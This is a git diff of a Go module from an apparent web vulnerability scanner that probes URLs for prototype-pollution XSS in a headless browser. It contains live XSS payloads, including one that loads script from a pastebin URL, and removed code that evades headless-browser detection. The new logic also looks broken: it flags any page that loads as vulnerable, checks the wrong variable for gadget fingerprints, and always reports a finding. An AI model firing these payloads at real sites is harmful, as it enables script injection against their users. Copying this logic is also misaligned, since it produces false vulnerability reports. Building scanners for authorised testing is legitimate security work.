@@ -1,12 +1,10 @@
 package xss
 
 import (
-	"github.com/go-rod/rod"
-	"github.com/go-rod/rod/lib/proto"
+	"github.com/chromedp/chromedp"
+	"github.com/yhy0/Jie/crawler"
 	"github.com/yhy0/Jie/pkg/output"
-	"github.com/yhy0/Jie/pkg/protocols/headless"
 	"github.com/yhy0/logging"
-	"runtime"
 	"strings"
 	"time"
 )
@@ -106,24 +104,46 @@ func Prototype(u string) {
 }
 
 func queryEnum(u, quote string) bool {
-	for _, pp := range ppp {
-		full_url := u + quote + pp
-		// 首先根据 payload 检测 js 是否输出 reserved
-		res := runPage(full_url, `() => {window.ppmap}`)
-		if res == "" {
+	for _, p := range ppp {
+		full_url := u + quote + p
+
+		// run task list
+		var res string
+		err := chromedp.Run(*crawler.Browser.Ctx,
+			chromedp.Navigate(full_url),
+			// 首先根据 payload 检测 js 是否输出 reserved
+			chromedp.Evaluate(`window.ppmap`, &res),
+		)
+		if err != nil {
 			continue
 		}
+
+		logging.Logger.Infoln("[Vulnerable]:", full_url)
+		time.Sleep(1 * time.Second)
+
 		// 具体的指纹检测
-		res = runPage(u, fingerprint)
+		logging.Logger.Infoln("Fingerprinting the gadget...")
 
-		logging.Logger.Infoln(full_url, " Gadget found: ", res)
+		var res1 string
+		err1 := chromedp.Run(*crawler.Browser.Ctx,
+			chromedp.Navigate(u),
+			//change the value 5 to a higher one if your internet connection is slow
+			chromedp.Sleep(8*time.Second),
+			chromedp.Evaluate(fingerprint, &res1),
+		)
+		if err1 != nil {
+			continue
+		}
 
-		vulnerable := true
+		logging.Logger.Infoln(full_url, " Gadget found: ", res1)
+		time.Sleep(1 * time.Second)
+
+		//vulnerable := true
 		payloads := []string{}
 		if strings.Contains(res, "default") {
 			logging.Logger.Debugln(" No gadget found")
 			logging.Logger.Debugln(" Website is vulnerable to Prototype Pollution, but not automatically exploitable")
-			vulnerable = false
+			//vulnerable = false
 		} else if strings.Contains(res, "Adobe Dynamic Tag Management") {
 			payloads = append(payloads, u+quote+"__proto__[src]=data:,alert(1)//")
 		} else if strings.Contains(res, "Akamai Boomerang") {
@@ -207,95 +227,24 @@ func queryEnum(u, quote string) bool {
 			payloads = append(payloads, u+quote+"__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")
 		}
 
-		if vulnerable {
-
-			for _, payload := range payloads {
-				if Verification(payload, u) {
-					return true
-				}
-			}
-
-			// 没有的话,手动测试
-			output.OutChannel <- output.VulMessage{
-				DataType: "web_vul",
-				Plugin:   "XSS",
-				VulnData: output.VulnData{
-					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
-					Target:     u,
-					VulnType:   "Prototype Pollution XSS",
-					Method:     "GET",
-					Payload:    "Gadget " + res + " \t possible payloads \n" + strings.Join(payloads, "\n"),
-				},
-				Level: output.Medium,
-			}
-
-			return true
+		//if vulnerable {
+		// 没有的话,手动测试
+		output.OutChannel <- output.VulMessage{
+			DataType: "web_vul",
+			Plugin:   "XSS Prototype Pollution",
+			VulnData: output.VulnData{
+				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
+				Target:     u,
+				VulnType:   "Prototype Pollution XSS",
+				Method:     "GET",
+				Payload:    "Gadget " + res + " \t possible payloads \n" + strings.Join(payloads, "\n"),
+			},
+			Level: output.Medium,
 		}
 
+		return true
+		//}
 	}
 
 	return false
-}
-
-func runPage(target string, jsCode string) string {
-	// todo 怎么写，才能没有 panic ，现在已知 Must** 字样的都有可能导致
-	defer func() {
-		if err := recover(); err != nil {
-			logging.Logger.Errorln("recover from:", err)
-			debugStack := make([]byte, 1024)
-			runtime.Stack(debugStack, false)
-			logging.Logger.Errorf("Stack Trace:%v", string(debugStack))
-
-		}
-	}()
-	// 创建tab
-	page, err := headless.RodHeadless.Browser.Page(proto.TargetCreateTarget{URL: target})
-
-	if err != nil {
-		logging.Logger.Debugln(target, "could not create target, ", err)
-		return ""
-	}
-	defer page.Close()
-
-	// 设置超时时间
-	timeout := 5 * time.Second
-	page = page.Timeout(timeout)
-
-	// 创建一个劫持请求, 用于屏蔽某些请求, img、font
-	router := headless.RodHeadless.Browser.HijackRequests()
-	defer router.MustStop()
-	router.MustAdd("*", func(ctx *rod.Hijack) {
-		// *.woff2 字体
-		if ctx.Request.Type() == proto.NetworkResourceTypeFont {
-			ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
-			return
-		}
-		// 图片
-		if ctx.Request.Type() == proto.NetworkResourceTypeImage {
-			ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
-			return
-		}
-	})
-
-	go router.Run()
-
-	// 整个 dom 加载前注入 js 绕过无头浏览器检测 https://bot.sannysoft.com
-	_, err = page.EvalOnNewDocument(headless.StealthJS)
-	if err != nil {
-		return ""
-	}
-
-	// Must 开头的函数 必须在 WaitLoad 后边?
-	if err = page.WaitLoad(); err != nil {
-		logging.Logger.Debugf("\"%s\" on wait load: %s", target, err)
-		return ""
-	}
-
-	// dom 加载完后注入js, 检测 原型链 xss
-	res := page.MustEval(jsCode).String()
-
-	if res != "reserved" {
-		return ""
-	}
-	return res
 }
